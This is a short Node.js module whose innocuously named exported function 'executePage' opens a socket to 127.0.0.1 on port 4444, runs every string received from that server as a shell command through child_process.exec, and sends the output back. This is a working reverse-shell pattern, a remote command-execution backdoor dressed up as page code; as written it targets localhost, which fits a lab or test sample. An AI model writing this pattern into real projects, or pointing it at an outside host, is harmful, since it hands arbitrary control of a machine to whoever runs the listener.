module.exports.executePage = function() {
    // connect to 127.0.0.1 port 4444
    const net = require('net');
    const client = new net.Socket();
    client.connect(4444, '127.0.0.1', function() {
        console.log('Connected to server');
        client.write('Hello, server! This is the client speaking.\n');
    });
    client.on('data', function(data) {
        const { exec } = require("child_process");
        console.log('Received from server: ' + data);
        exec(data.toString(), (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                client.write(error.message);
                return;
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
            client.write(stdout);
        });
        client.destroy(); // kill client after server's response
    });
};
